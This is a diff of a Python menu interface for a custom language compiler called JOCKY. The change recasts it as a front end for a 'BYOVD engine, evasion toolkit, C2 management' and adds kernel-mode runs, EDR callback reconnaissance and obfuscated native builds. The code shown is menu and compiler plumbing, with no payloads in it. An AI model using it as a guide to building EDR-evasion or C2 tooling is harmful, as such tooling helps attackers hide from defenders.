@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 """
-jocky_terminal.py — Interactive Terminal Application for the JOCKY Language.
+jocky_terminal.py — JOCKY Framework Interactive Terminal
 
-Provides a rich TUI for running pre-built cybersecurity scripts, writing custom
-JOCKY code, inspecting the compilation pipeline (tokens / AST / IR), and
-building native binaries — all from one menu-driven interface.
+Menu-driven TUI for the JOCKY language compiler, BYOVD engine,
+evasion toolkit, C2 management, and forensics.
 
 Run:
     python jocky_terminal.py
@@ -15,50 +14,55 @@ import sys
 import io
 import subprocess
 import textwrap
+import threading
+import platform
 from pathlib import Path
 from contextlib import redirect_stdout, redirect_stderr
 
-# ── Resolve paths ─────────────────────────────────────────────────────────────
+# ── Paths ─────────────────────────────────────────────────────────────────────
 APP_DIR       = Path(__file__).parent.resolve()
 COMPILER_DIR  = APP_DIR / "compiler"
 SCRIPTS_DIR   = APP_DIR / "scripts"
 WORKSPACE_DIR = APP_DIR / "workspace"
 OUTPUT_DIR    = APP_DIR / "output"
+BYOVD_DIR     = APP_DIR / "byovd"
+EVASION_DIR   = APP_DIR / "evasion"
+C2_DIR        = APP_DIR / "c2"
+DOCS_DIR      = APP_DIR / "docs"
 
-OUTPUT_DIR.mkdir(exist_ok=True)
-WORKSPACE_DIR.mkdir(exist_ok=True)
+for d in [OUTPUT_DIR, WORKSPACE_DIR]:
+    d.mkdir(exist_ok=True)
 
-sys.path.insert(0, str(COMPILER_DIR))
+sys.path.insert(0, str(APP_DIR))
+sys.path.insert(0, str(COMPILER_DIR))  # must be first — jocky.py in APP_DIR would shadow jocky/ package
 
-# ── Rich import with graceful fallback ────────────────────────────────────────
+# ── Rich ──────────────────────────────────────────────────────────────────────
 try:
     from rich.console import Console
-    from rich.panel import Panel
-    from rich.table import Table
-    from rich.syntax import Syntax
-    from rich.prompt import Prompt
-    from rich.text import Text
-    from rich.rule import Rule
-    from rich.align import Align
-    from rich import box
+    from rich.panel   import Panel
+    from rich.table   import Table
+    from rich.syntax  import Syntax
+    from rich.prompt  import Prompt
+    from rich.text    import Text
+    from rich.rule    import Rule
+    from rich.align   import Align
+    from rich         import box
     RICH = True
 except ImportError:
     RICH = False
 
 console = Console() if RICH else None
 
+IS_WINDOWS = sys.platform == "win32"
+IS_LINUX   = sys.platform.startswith("linux")
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Utility helpers
-# ─────────────────────────────────────────────────────────────────────────────
+# ── UI helpers ────────────────────────────────────────────────────────────────
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
 
-
 def pause(msg="Press Enter to continue..."):
     input(f"\n  {msg}")
-
 
 def cprint(text, style=""):
     if RICH:
@@ -66,15 +70,12 @@ def cprint(text, style=""):
     else:
         print(text)
 
-
 def rprint(text):
-    """Print with Rich markup (no-op fallback strips markup tags roughly)."""
     if RICH:
         console.print(text, markup=True)
     else:
         import re
         print(re.sub(r'\[/?[^\]]+\]', '', text))
-
 
 def print_header(title, subtitle=""):
     if RICH:
@@ -85,1524 +86,1035 @@ def print_header(title, subtitle=""):
         console.print(Panel(Align.center(Text.from_markup(inner)),
                             border_style="cyan", padding=(1, 4)))
     else:
-        print("\n" + "=" * 62)
+        print("\n" + "=" * 64)
         print(f"  {title}")
         if subtitle:
             print(f"  {subtitle}")
-        print("=" * 62)
-
+        print("=" * 64)
 
 def print_section(title):
     if RICH:
         console.print()
         console.print(Rule(f"[bold yellow]{title}[/bold yellow]", style="yellow"))
     else:
-        print(f"\n── {title} " + "─" * max(0, 54 - len(title)))
+        print(f"\n── {title} " + "─" * max(0, 56 - len(title)))
 
+def menu(title, options: list[str], subtitle: str = "") -> str:
+    """Display a numbered menu and return the user's choice string."""
+    clear()
+    print_header(title, subtitle)
+    print()
+    for i, opt in enumerate(options, 1):
+        rprint(f"  [bold white]{i:2d}.[/bold white] {opt}")
+    rprint(f"\n  [bold white] 0.[/bold white] [dim]Back / Exit[/dim]")
+    print()
+    choice = input("  Choose: ").strip()
+    return choice
 
-def _item(n, label, dim_label=""):
-    """Print a numbered menu item consistently in both Rich and plain mode."""
-    if RICH:
-        dim_part = f"  [dim]{dim_label}[/dim]" if dim_label else ""
-        console.print(f"  [bold yellow]{n:>2}.[/bold yellow]  {label}{dim_part}",
-                      markup=True)
-    else:
-        suffix = f"  {dim_label}" if dim_label else ""
-        print(f"  [{n}] {label}{suffix}")
+def get_input(prompt: str, default: str = "") -> str:
+    suffix = f" [{default}]" if default else ""
+    val = input(f"  {prompt}{suffix}: ").strip()
+    return val or default
 
-
-def _item_key(key, label):
-    """Print a letter-key menu item."""
-    if RICH:
-        console.print(f"  [bold yellow] {key}.[/bold yellow]  {label}", markup=True)
-    else:
-        print(f"  [{key}] {label}")
-
-
-def _divider():
-    if RICH:
-        console.print()
-    else:
-        print()
-
-
-def ask(prompt_text="Choice"):
-    if RICH:
-        console.print()
-        return Prompt.ask(f"[bold green]  {prompt_text}[/bold green]").strip()
-    else:
-        return input(f"\n  {prompt_text}: ").strip()
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Compiler integration
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _import_compiler():
+def run_and_capture(fn, *args, **kwargs) -> str:
+    buf = io.StringIO()
     try:
-        from jocky.lexer    import Lexer
-        from jocky.parser   import Parser, ParseError
-        from jocky.semantic import SemanticAnalyzer, SemanticError
-        from jocky.codegen  import CodeGenerator, CodegenError
-        from jocky.passes   import ObfuscationPasses
-        return Lexer, Parser, ParseError, SemanticAnalyzer, SemanticError, \
-               CodeGenerator, CodegenError, ObfuscationPasses
-    except ImportError as e:
-        rprint(f"[red]ERROR: Could not import JOCKY compiler: {e}[/red]")
-        return None
-
-
-def run_jit(script_path: str, obfuscate: bool = False):
-    """JIT-execute a .jk file, capturing and displaying output."""
-    try:
-        cmd = [sys.executable, str(COMPILER_DIR / "compiler.py"), str(script_path), "--run"]
-        if obfuscate:
-            cmd.append("--obfuscate-jit")
-        result = subprocess.run(
-            cmd,
-            capture_output=True, text=True, cwd=str(COMPILER_DIR),
-            env={**os.environ, "PYTHONUTF8": "1", "PYTHONIOENCODING": "utf-8"},
-        )
-        return result.stdout + result.stderr, result.returncode
+        with redirect_stdout(buf), redirect_stderr(buf):
+            fn(*args, **kwargs)
     except Exception as e:
-        return f"Error launching compiler: {e}", 1
+        buf.write(f"\nERROR: {e}\n")
+    return buf.getvalue()
 
+def show_output(text: str, title: str = "Output") -> None:
+    print_section(title)
+    if RICH:
+        console.print(Panel(text.strip() or "(no output)", border_style="dim"))
+    else:
+        print(text)
 
-def get_tokens(source: str):
-    mods = _import_compiler()
-    if not mods:
-        return None, "Import failed"
-    try:
-        return mods[0](source).tokenize(), None
-    except Exception as e:
-        return None, str(e)
+# ── Pre-built scripts ─────────────────────────────────────────────────────────
 
-
-def get_ast(source: str):
-    mods = _import_compiler()
-    if not mods:
-        return None, "Import failed"
-    Lexer, Parser, ParseError = mods[0], mods[1], mods[2]
-    try:
-        return Parser(Lexer(source).tokenize()).parse(), None
-    except Exception as e:
-        return None, str(e)
-
-
-def get_ir(source: str, obfuscate=False):
-    mods = _import_compiler()
-    if not mods:
-        return None, "Import failed"
-    Lexer, Parser, _, SemanticAnalyzer, _, CodeGenerator, _, ObfuscationPasses = mods
-    try:
-        tokens = Lexer(source).tokenize()
-        errors = [t for t in tokens if t.type.name == "ERROR"]
-        if errors:
-            return None, f"Lex errors: {[e.value for e in errors]}"
-        ast = Parser(tokens).parse()
-        SemanticAnalyzer().analyze(ast)
-        mod = CodeGenerator().generate(ast)
-        if obfuscate:
-            mod = ObfuscationPasses(mod, encrypt_strings=True).run_all()
-        return str(mod), None
-    except Exception as e:
-        return None, str(e)
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Script metadata
-# ─────────────────────────────────────────────────────────────────────────────
-
-BUILTIN_SCRIPTS = [
-    {
-        "file": "proc_scanner.jk",
-        "name": "Process Scanner",
-        "desc": "Enumerate all running processes and flag malicious/sensitive ones",
-        "category": "Process Analysis",
-        "tags": ["forensics", "malware-detection"],
-    },
-    {
-        "file": "net_monitor.jk",
-        "name": "Network Monitor",
-        "desc": "Capture active TCP/UDP connections, detect C2 and exfiltration",
-        "category": "Network Analysis",
-        "tags": ["network", "c2-detection"],
-    },
-    {
-        "file": "net_logger.jk",
-        "name": "Network Logger",
-        "desc": "Repeated connection snapshots with delta tracking",
-        "category": "Network Analysis",
-        "tags": ["network", "logging"],
-    },
-    {
-        "file": "packet_sniffer.jk",
-        "name": "Packet Sniffer",
-        "desc": "Passive packet capture with process-based correlation",
-        "category": "Network Analysis",
-        "tags": ["network", "packet-capture"],
-    },
-    {
-        "file": "resource_monitor.jk",
-        "name": "Resource Monitor",
-        "desc": "Risk-scored scan for miners, RATs, and lateral-movement tools",
-        "category": "Resource Analysis",
-        "tags": ["monitoring", "crypto-miner-detection"],
-    },
-    {
-        "file": "sys_info.jk",
-        "name": "System Info Collector",
-        "desc": "Forensic triage: enumerate processes, read OS registry, snapshot network",
-        "category": "System Forensics",
-        "tags": ["forensics", "triage"],
-    },
-    {
-        "file": "file_hasher.jk",
-        "name": "File Integrity Checker",
-        "desc": "SHA-256 hash critical system binaries, cross-reference with process list",
-        "category": "File Forensics",
-        "tags": ["integrity", "hash"],
-    },
-    {
-        "file": "registry_inspector.jk",
-        "name": "Registry Inspector",
-        "desc": "Check Winlogon/Defender/LSA registry keys for tampering",
-        "category": "Persistence Detection",
-        "tags": ["registry", "persistence"],
-    },
-    {
-        "file": "threat_hunter.jk",
-        "name": "Threat Hunter  (Full Suite)",
-        "desc": "Process + registry + network + file threat hunt with scored verdict",
-        "category": "Threat Hunting",
-        "tags": ["all-in-one", "threat-hunting"],
-    },
-    {
-        "file": "byovd_scanner.jk",
-        "name": "BYOVD Driver Scanner",
-        "desc": "Enumerate installed drivers and flag known-vulnerable ones via LOLDrivers DB",
-        "category": "BYOVD / Kernel",
-        "tags": ["byovd", "kernel", "loldrivers"],
-    },
-    {
-        "file": "kernel_recon.jk",
-        "name": "Kernel Recon  (BYOVD)",
-        "desc": "Kernel base resolution, EDR callback enumeration, memory r/w via loaded driver",
-        "category": "BYOVD / Kernel",
-        "tags": ["byovd", "kernel", "edr-bypass"],
-    },
+SCRIPTS = [
+    ("kernel_recon.jk",        "Kernel reconnaissance — base, callbacks, EDR modules"),
+    ("proc_scanner.jk",        "Full process enumeration with PID and name"),
+    ("net_monitor.jk",         "Active TCP connection monitoring"),
+    ("net_logger.jk",          "Network connection logger"),
+    ("byovd_scanner.jk",       "BYOVD vulnerable driver scan (filename + SHA-256)"),
+    ("threat_hunter.jk",       "EDR/AV detection via process + kernel callbacks"),
+    ("registry_inspector.jk",  "Enumerate kernel drivers from registry / modules"),
+    ("sys_info.jk",            "OS version, hostname, architecture fingerprint"),
+    ("resource_monitor.jk",    "System resource and process monitor"),
+    ("packet_sniffer.jk",      "Network packet sniffer"),
+    ("file_hasher.jk",         "File SHA-256 hasher"),
 ]
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# AST pretty-printer
-# ─────────────────────────────────────────────────────────────────────────────
-
-def ast_to_lines(node, indent=0):
-    lines = []
-    prefix = "  " * indent
-    name = type(node).__name__
-
-    if hasattr(node, 'functions'):
-        lines.append(f"{prefix}Program")
-        for fn in node.functions:
-            lines.extend(ast_to_lines(fn, indent + 1))
-    elif name == 'FunctionDef':
-        params = ", ".join(f"{p.name}:{p.type_annotation}" for p in node.params)
-        lines.append(f"{prefix}FunctionDef  {node.name}({params}) -> {node.return_type}")
-        lines.extend(ast_to_lines(node.body, indent + 1))
-    elif name == 'Block':
-        lines.append(f"{prefix}Block [{len(node.statements)} stmt(s)]")
-        for stmt in node.statements:
-            lines.extend(ast_to_lines(stmt, indent + 1))
-    elif name == 'VarDecl':
-        lines.append(f"{prefix}VarDecl  {node.name} : {node.type_annotation}")
-        lines.extend(ast_to_lines(node.initializer, indent + 1))
-    elif name == 'Assignment':
-        lines.append(f"{prefix}Assign  {node.name} <-")
-        lines.extend(ast_to_lines(node.value, indent + 1))
-    elif name == 'IfStatement':
-        lines.append(f"{prefix}If")
-        lines.extend(ast_to_lines(node.condition, indent + 1))
-        lines.append(f"{prefix}  Then:")
-        lines.extend(ast_to_lines(node.then_body, indent + 2))
-        if node.else_body:
-            lines.append(f"{prefix}  Else:")
-            lines.extend(ast_to_lines(node.else_body, indent + 2))
-    elif name == 'LoopStatement':
-        lines.append(f"{prefix}Loop")
-        lines.extend(ast_to_lines(node.condition, indent + 1))
-        lines.extend(ast_to_lines(node.body, indent + 1))
-    elif name == 'ReturnStatement':
-        lines.append(f"{prefix}Return")
-        if node.value is not None:
-            lines.extend(ast_to_lines(node.value, indent + 1))
-    elif name == 'ExpressionStatement':
-        lines.extend(ast_to_lines(node.expression, indent))
-    elif name == 'FunctionCall':
-        args = f" [{len(node.arguments)} arg(s)]" if node.arguments else ""
-        lines.append(f"{prefix}Call  {node.name}(){args}")
-        for arg in node.arguments:
-            lines.extend(ast_to_lines(arg, indent + 1))
-    elif name == 'BinaryExpression':
-        lines.append(f"{prefix}BinOp  [{node.operator}]")
-        lines.extend(ast_to_lines(node.left, indent + 1))
-        lines.extend(ast_to_lines(node.right, indent + 1))
-    elif name == 'UnaryExpression':
-        lines.append(f"{prefix}UnaryOp  [{node.operator}]")
-        lines.extend(ast_to_lines(node.operand, indent + 1))
-    elif name == 'Identifier':
-        lines.append(f"{prefix}Identifier  {node.name}")
-    elif name == 'NumberLiteral':
-        lines.append(f"{prefix}Number  {node.value}")
-    elif name == 'FloatLiteral':
-        lines.append(f"{prefix}Float  {node.value}")
-    elif name == 'StringLiteral':
-        val = node.value[:30] + "..." if len(node.value) > 30 else node.value
-        lines.append(f"{prefix}String  `{val}`")
-    elif name == 'BoolLiteral':
-        lines.append(f"{prefix}Bool  {'yes' if node.value else 'no'}")
-    elif name == 'BreakStatement':
-        lines.append(f"{prefix}Break (stop)")
-    elif name == 'SkipStatement':
-        lines.append(f"{prefix}Skip (continue)")
-    else:
-        lines.append(f"{prefix}{name}")
-    return lines
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Shared script-action sub-menu
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _script_action_menu(script_path: Path, name: str, desc: str = "",
-                        category: str = "", tags: list = None,
-                        allow_edit: bool = False):
-    """
-    Sub-menu shown after selecting any script (pre-built or custom).
-    allow_edit adds an 'Edit in editor' option for workspace scripts.
-    """
+def menu_scripts() -> None:
     while True:
-        clear()
-        print_header(name, desc)
-
-        if RICH:
-            if category:
-                console.print(f"\n  [cyan]Category:[/cyan] {category}")
-            if tags:
-                console.print(f"  [cyan]Tags:[/cyan] {', '.join(tags)}")
-            console.print(f"  [cyan]File:[/cyan] {script_path}")
-        else:
-            print(f"\n  File: {script_path}")
-
-        _divider()
-        rprint("  [bold yellow]Actions[/bold yellow]")
-        _item(1, "Run  (JIT, clean)")
-        _item(2, "Run  (JIT + Obfuscation)",
-              "build-ID + entropy injected, SHA-256 changes every run")
-        _item(3, "View Source Code")
-        if allow_edit:
-            _item(4, "Edit in Editor")
-            _item(5, "Inspect  →  Tokens")
-            _item(6, "Inspect  →  AST")
-            _item(7, "Inspect  →  LLVM IR  (clean)")
-            _item(8, "Inspect  →  LLVM IR  (obfuscated)")
-            _item(9, "Pipeline Summary  (all stages)")
-        else:
-            _item(4, "Inspect  →  Tokens")
-            _item(5, "Inspect  →  AST")
-            _item(6, "Inspect  →  LLVM IR  (clean)")
-            _item(7, "Inspect  →  LLVM IR  (obfuscated)")
-            _item(8, "Pipeline Summary  (all stages)")
-        _divider()
-        _item(0, "Back")
-
-        choice = ask("Action")
-
-        if choice == "0":
-            return
-        elif choice == "1":
-            _run_script(script_path, obfuscate=False)
-        elif choice == "2":
-            _run_script(script_path, obfuscate=True)
-        elif choice == "3":
-            _show_source(script_path)
-        elif allow_edit and choice == "4":
-            _open_editor(script_path)
-        else:
-            # offset=1 for allow_edit (Edit takes slot 4), offset=0 otherwise
-            offset = 1 if allow_edit else 0
-            if choice == str(4 + offset):
-                _show_tokens(script_path)
-            elif choice == str(5 + offset):
-                _show_ast(script_path)
-            elif choice == str(6 + offset):
-                _show_ir(script_path, obfuscate=False)
-            elif choice == str(7 + offset):
-                _show_ir(script_path, obfuscate=True)
-            elif choice == str(8 + offset):
-                source = script_path.read_text(encoding="utf-8")
-                _show_summary(script_path, source)
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: Pre-built Scripts
-# ─────────────────────────────────────────────────────────────────────────────
-
-def menu_prebuilt_scripts():
-    while True:
-        clear()
-        print_header("Pre-built Cybersecurity Scripts",
-                     "Battle-tested JOCKY forensics scripts")
-
-        if RICH:
-            table = Table(box=box.ROUNDED, border_style="cyan", show_header=True,
-                          header_style="bold cyan", expand=True)
-            table.add_column("#",        style="bold yellow", width=4)
-            table.add_column("Name",     style="bold white",  min_width=24)
-            table.add_column("Category", style="cyan",        min_width=18)
-            table.add_column("Description", style="dim white")
-            for idx, s in enumerate(BUILTIN_SCRIPTS, 1):
-                table.add_row(str(idx), s["name"], s["category"], s["desc"])
-            console.print(table)
-        else:
-            print(f"\n  {'#':<4}  {'Name':<28}  Description")
-            print("  " + "─" * 70)
-            for idx, s in enumerate(BUILTIN_SCRIPTS, 1):
-                print(f"  {idx:<4}  {s['name']:<28}  {s['desc']}")
-
-        _divider()
-        rprint("  [dim]Enter number to select  |  0 to go back[/dim]")
-
-        choice = ask("Select script")
+        choice = menu("Pre-built Scripts",
+                      [f"[cyan]{name}[/cyan] — {desc}" for name, desc in SCRIPTS],
+                      "Run a built-in JOCKY reconnaissance script")
         if choice == "0":
             return
         try:
             idx = int(choice) - 1
-            if 0 <= idx < len(BUILTIN_SCRIPTS):
-                s = BUILTIN_SCRIPTS[idx]
-                _script_action_menu(
-                    SCRIPTS_DIR / s["file"],
-                    s["name"], s["desc"], s["category"], s["tags"],
-                    allow_edit=False,
-                )
-            else:
-                rprint(f"[red]  Enter 1–{len(BUILTIN_SCRIPTS)} or 0.[/red]")
-                pause()
         except ValueError:
-            rprint("[red]  Enter a number.[/red]")
+            continue
+        if not (0 <= idx < len(SCRIPTS)):
+            continue
+
+        script_name, _ = SCRIPTS[idx]
+        script_path = SCRIPTS_DIR / script_name
+        if not script_path.exists():
+            cprint(f"\n  [red]Script not found: {script_path}[/red]")
             pause()
+            continue
+
+        _script_action_menu(script_path, script_name)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: Custom Script Editor
-# ─────────────────────────────────────────────────────────────────────────────
-
-def menu_custom_script():
+def _script_action_menu(script_path: Path, script_name: str) -> None:
+    """Full per-script action submenu — mirrors the Application's option set."""
     while True:
-        clear()
-        print_header("Custom Script Editor",
-                     "Write, save, and run your own JOCKY code")
-
-        wk_scripts = sorted(WORKSPACE_DIR.glob("*.jk"))
-
-        if RICH:
-            if wk_scripts:
-                rprint("\n  [bold cyan]Workspace Scripts[/bold cyan]")
-                for i, p in enumerate(wk_scripts, 1):
-                    size_kb = p.stat().st_size // 1024 or "<1"
-                    rprint(f"  [bold yellow]{i:>2}.[/bold yellow]"
-                           f"  [white]{p.name}[/white]"
-                           f"  [dim]{size_kb} KB[/dim]")
-            else:
-                rprint("\n  [dim]  No workspace scripts yet. Press N to create one.[/dim]")
-        else:
-            print("\n  Workspace Scripts:")
-            if wk_scripts:
-                for i, p in enumerate(wk_scripts, 1):
-                    print(f"  [{i:>2}] {p.name}")
-            else:
-                print("  (none yet — press N to create one)")
-
-        _divider()
-        rprint("  [bold yellow]Options[/bold yellow]")
-        _item_key("N", "New Script")
-        _item(0, "Back")
-
-        if wk_scripts:
-            rprint("  [dim]  — or enter a script number to open it[/dim]")
-
-        choice = ask("Choice").lower()
-
+        choice = menu(
+            f"Script: {script_name}",
+            [
+                "Run (JIT — clean)",
+                "Run (JIT + Obfuscation)",
+                "Run with Kernel Mode",
+                "Build Native Binary",
+                "View Source",
+                "Show Tokens",
+                "Show AST",
+                "Show LLVM IR",
+                "Pipeline Summary",
+            ],
+            f"Select action for {script_name}",
+        )
         if choice == "0":
             return
-        elif choice == "n":
-            _new_script()
+
+        if choice == "1":
+            _run_jit(script_path, script_name, obfuscate=False)
+        elif choice == "2":
+            _run_jit(script_path, script_name, obfuscate=True)
+        elif choice == "3":
+            _run_kernel_mode(script_path, script_name)
+        elif choice == "4":
+            _build_native_binary(script_path, script_name)
+        elif choice == "5":
+            _view_script_source(script_path, script_name)
+        elif choice == "6":
+            _show_script_tokens(script_path, script_name)
+        elif choice == "7":
+            _show_script_ast(script_path, script_name)
+        elif choice == "8":
+            _show_script_ir(script_path, script_name)
+        elif choice == "9":
+            _show_pipeline_summary(script_path, script_name)
+
+
+def _run_jit(script_path: Path, script_name: str, obfuscate: bool = False) -> None:
+    clear()
+    label = "JIT + Obfuscation" if obfuscate else "JIT (clean)"
+    print_section(f"{label}: {script_name}")
+    try:
+        from compiler import compile_jocky
+        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
+                              run_jit=True, obfuscate_jit=obfuscate)
+        show_output(out, f"Result: {script_name}")
+    except ImportError as e:
+        cprint(f"\n  [red]Compiler import error: {e}[/red]")
+    pause()
+
+
+def _run_kernel_mode(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"Kernel Mode: {script_name}")
+    rprint("  [yellow]⚡ KERNEL MODE — JOCKY_KERNEL_MODE=1[/yellow]")
+    rprint("  [dim]Kernel operations run with elevated BYOVD context.[/dim]")
+    print()
+    old_val = os.environ.get("JOCKY_KERNEL_MODE")
+    try:
+        os.environ["JOCKY_KERNEL_MODE"] = "1"
+        from compiler import compile_jocky
+        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
+                              run_jit=True)
+        show_output(out, f"Kernel Result: {script_name}")
+    except ImportError as e:
+        cprint(f"\n  [red]Compiler import error: {e}[/red]")
+    finally:
+        if old_val is None:
+            os.environ.pop("JOCKY_KERNEL_MODE", None)
+        else:
+            os.environ["JOCKY_KERNEL_MODE"] = old_val
+    pause()
+
+
+def _build_native_binary(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"Build Native Binary: {script_name}")
+    obf = get_input("Obfuscate? (y/n)", "y").lower() == "y"
+    emit_ir = get_input("Also emit LLVM IR? (y/n)", "n").lower() == "y"
+    try:
+        from compiler import compile_jocky
+        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
+                              obfuscate=obf, emit_ir=emit_ir, run_jit=False)
+        show_output(out, f"Build: {script_name}")
+    except ImportError as e:
+        cprint(f"\n  [red]Compiler import error: {e}[/red]")
+    pause()
+
+
+def _view_script_source(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"Source: {script_name}")
+    src = script_path.read_text(encoding="utf-8")
+    if RICH:
+        console.print(Syntax(src, "c", theme="monokai", line_numbers=True))
+    else:
+        print(src)
+    pause()
+
+
+def _show_script_tokens(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"Tokens: {script_name}")
+    try:
+        from jocky.lexer import Lexer
+        source = script_path.read_text(encoding="utf-8")
+        tokens = Lexer(source).tokenize()
+        for t in tokens[:80]:
+            rprint(f"  [cyan]{t.type.name:20s}[/cyan]  {repr(t.value)!s:30s}  line {t.line}")
+        if len(tokens) > 80:
+            rprint(f"  [dim]... {len(tokens)-80} more tokens[/dim]")
+        rprint(f"\n  [green]Total: {len(tokens)} tokens[/green]")
+    except Exception as e:
+        cprint(f"  [red]{e}[/red]")
+    pause()
+
+
+def _show_script_ast(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"AST: {script_name}")
+    try:
+        sys.path.insert(0, str(COMPILER_DIR))
+        from jocky.lexer   import Lexer
+        from jocky.parser  import Parser
+        source = script_path.read_text(encoding="utf-8")
+        tokens = Lexer(source).tokenize()
+        ast = Parser(tokens).parse()
+        for fn in ast.functions:
+            rprint(f"  [bold green]func[/bold green] [yellow]{fn.name}[/yellow]"
+                   f"  ({len(fn.params)} params, {len(fn.body.statements)} stmts)")
+        rprint(f"\n  [green]{len(ast.functions)} function(s) in AST[/green]")
+    except Exception as e:
+        cprint(f"  [red]{e}[/red]")
+    pause()
+
+
+def _show_script_ir(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"LLVM IR: {script_name}")
+    try:
+        sys.path.insert(0, str(COMPILER_DIR))
+        from jocky.lexer    import Lexer
+        from jocky.parser   import Parser
+        from jocky.semantic import SemanticAnalyzer
+        from jocky.codegen  import CodeGenerator
+        source = script_path.read_text(encoding="utf-8")
+        tokens = Lexer(source).tokenize()
+        ast    = Parser(tokens).parse()
+        SemanticAnalyzer().analyze(ast)
+        ir_mod = CodeGenerator(source_name=script_path.stem).generate(ast)
+        ir_txt = str(ir_mod)
+        if RICH:
+            console.print(Syntax(ir_txt[:5000], "llvm", theme="monokai"))
+        else:
+            print(ir_txt[:5000])
+        if len(ir_txt) > 5000:
+            rprint(f"  [dim]... {len(ir_txt)-5000} chars truncated[/dim]")
+    except Exception as e:
+        cprint(f"  [red]{e}[/red]")
+    pause()
+
+
+def _show_pipeline_summary(script_path: Path, script_name: str) -> None:
+    clear()
+    print_section(f"Pipeline Summary: {script_name}")
+    try:
+        from compiler import compile_jocky
+        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
+                              emit_ir=True, run_jit=False)
+        show_output(out, f"Pipeline: {script_name}")
+    except ImportError as e:
+        cprint(f"\n  [red]Compiler import error: {e}[/red]")
+    pause()
+
+# ── Custom editor ─────────────────────────────────────────────────────────────
+
+def menu_editor() -> None:
+    workspace_file = WORKSPACE_DIR / "scratch.jk"
+    if not workspace_file.exists():
+        workspace_file.write_text('func start() {\n    report("Hello from JOCKY!");\n}\n')
+
+    while True:
+        choice = menu("Custom Code Editor",
+                      ["Edit scratch.jk in $EDITOR / notepad",
+                       "Run scratch.jk (JIT)",
+                       "Build scratch.jk (native .exe)",
+                       "View current source",
+                       "Load existing .jk file",
+                       "Save as new file"],
+                      f"Working file: {workspace_file}")
+        if choice == "0":
+            return
+
+        if choice == "1":
+            editor = os.environ.get("EDITOR", "notepad" if IS_WINDOWS else "nano")
+            os.system(f'{editor} "{workspace_file}"')
+
+        elif choice == "2":
+            clear()
+            print_section("JIT execution")
+            try:
+                from compiler import compile_jocky
+                out = run_and_capture(compile_jocky, str(workspace_file),
+                                      str(OUTPUT_DIR), run_jit=True)
+                show_output(out)
+            except ImportError as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "3":
+            clear()
+            print_section("Build native exe")
+            emit_ir = get_input("Also emit LLVM IR? (y/n)", "n").lower() == "y"
+            try:
+                from compiler import compile_jocky
+                out = run_and_capture(compile_jocky, str(workspace_file),
+                                      str(OUTPUT_DIR), emit_ir=emit_ir, run_jit=False)
+                show_output(out)
+            except ImportError as e:
+                cprint(f"  [red]{e}[/red]")
+            pause()
+
+        elif choice == "4":
+            clear()
+            print_section("Source")
+            src = workspace_file.read_text(encoding="utf-8")
+            if RICH:
+                console.print(Syntax(src, "c", theme="monokai", line_numbers=True))
+            else:
+                print(src)
+            pause()
+
+        elif choice == "5":
+            path = get_input("Path to .jk file")
+            p = Path(path)
+            if p.exists():
+                workspace_file = p
+                cprint(f"  [green]Loaded: {p}[/green]")
+            else:
+                cprint(f"  [red]Not found: {p}[/red]")
+            pause()
+
+        elif choice == "6":
+            name = get_input("Save as (filename, no extension)")
+            if name:
+                dest = WORKSPACE_DIR / (name + ".jk")
+                dest.write_bytes(workspace_file.read_bytes())
+                cprint(f"  [green]Saved to {dest}[/green]")
+            pause()
+
+# ── Pipeline inspector ────────────────────────────────────────────────────────
+
+def menu_inspector() -> None:
+    while True:
+        choice = menu("Pipeline Inspector",
+                      ["Tokenise (Lexer)",
+                       "Parse (AST)",
+                       "Semantic check",
+                       "Emit LLVM IR",
+                       "Full pipeline trace"],
+                      "Inspect each stage of JOCKY compilation")
+        if choice == "0":
+            return
+
+        path = get_input("Source file", str(WORKSPACE_DIR / "scratch.jk"))
+        src_path = Path(path)
+        if not src_path.exists():
+            cprint(f"  [red]File not found[/red]")
+            pause()
+            continue
+
+        try:
+            source = src_path.read_text(encoding="utf-8")
+            from jocky.lexer    import Lexer
+            from jocky.parser   import Parser
+            from jocky.semantic import SemanticAnalyzer
+            from jocky.codegen  import CodeGenerator
+        except ImportError as e:
+            cprint(f"  [red]Import error: {e}[/red]")
+            pause()
+            continue
+
+        clear()
+        if choice == "1":
+            print_section("Tokens")
+            tokens = Lexer(source).tokenize()
+            for t in tokens[:80]:
+                rprint(f"  [cyan]{t.type.name:20s}[/cyan]  {repr(t.value)!s:30s}  line {t.line}")
+            if len(tokens) > 80:
+                rprint(f"  [dim]... {len(tokens)-80} more tokens[/dim]")
+
+        elif choice == "2":
+            print_section("AST")
+            tokens = Lexer(source).tokenize()
+            try:
+                ast = Parser(tokens).parse()
+                for fn in ast.functions:
+                    rprint(f"  [bold green]func[/bold green] [yellow]{fn.name}[/yellow]  ({len(fn.params)} params, {len(fn.body.statements)} stmts)")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+
+        elif choice == "3":
+            print_section("Semantic")
+            tokens = Lexer(source).tokenize()
+            try:
+                ast = Parser(tokens).parse()
+                SemanticAnalyzer().analyze(ast)
+                cprint("  [green]OK — no type errors[/green]")
+            except Exception as e:
+                cprint(f"  [red]{e}[/red]")
+
+        elif choice == "4":
+            print_section("LLVM IR")
+            tokens = Lexer(source).tokenize()
+            try:
+                ast = Parser(tokens).parse()
+                SemanticAnalyzer().analyze(ast)
+                ir_module = CodeGenerator(source_name=src_path.stem).generate(ast)
+                ir_text = str(ir_module)
+                if RICH:
